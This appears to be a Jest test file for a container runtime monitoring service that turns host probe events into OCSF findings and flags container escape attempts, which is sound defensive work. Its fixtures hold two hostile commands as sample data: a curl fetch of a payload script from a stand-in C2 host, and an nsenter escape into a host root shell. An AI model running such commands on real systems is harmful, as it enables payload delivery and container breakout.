import { HostRuntimeMonitorService, RawHostProbeEvent } from './host-runtime-monitor.service';

describe('HostRuntimeMonitorService', () => {
  let monitorService: HostRuntimeMonitorService;

  beforeEach(() => {
    monitorService = new HostRuntimeMonitorService();
  });

  it('should normalize raw host probe telemetry into OCSF Container Runtime finding', () => {
    const rawEvent: RawHostProbeEvent = {
      probeId: 'probe-001',
      hostName: 'node-worker-gke-01',
      containerId: 'container-k8s-pod-1234',
      containerName: 'payment-processor',
      syscall: 'sys_enter_execve',
      pid: 4022,
      uid: 1000,
      binaryPath: '/usr/bin/curl',
      commandLine: 'curl -s https://evil-c2.net/payload.sh',
      timestampEpochNs: Date.now() * 1000000,
    };

    const finding = monitorService.processHostProbe(rawEvent);

    expect(finding.findingId).toBeDefined();
    expect(finding.classUid).toBe(4002);
    expect(finding.categoryUid).toBe(4);
    expect(finding.canonicalHash).toBeDefined();
    expect(finding.container?.name).toBe('payment-processor');
    expect(finding.actor.process.binaryPath).toBe('/usr/bin/curl');
  });

  it('should detect container breakout attempts and assign severity 6 (Fatal/Critical)', () => {
    const breakoutEvent: RawHostProbeEvent = {
      probeId: 'probe-002',
      hostName: 'node-worker-gke-01',
      containerId: 'container-compromised-456',
      syscall: 'container_escape_attempt',
      pid: 9912,
      uid: 0,
      binaryPath: '/nsenter',
      commandLine: '/nsenter -t 1 -m -u -i -n -p /bin/sh',
      timestampEpochNs: Date.now() * 1000000,
    };

    const finding = monitorService.processHostProbe(breakoutEvent);

    expect(finding.severityId).toBe(6);
    expect(finding.threatDetails?.isBreakoutAttempt).toBe(true);
    expect(finding.threatDetails?.mitreTechniqueId).toBe('T1611');
    expect(finding.threatDetails?.ruleName).toBe('HOST-RULE-CONTAINER-ESCAPE-DETECTED');
  });
});
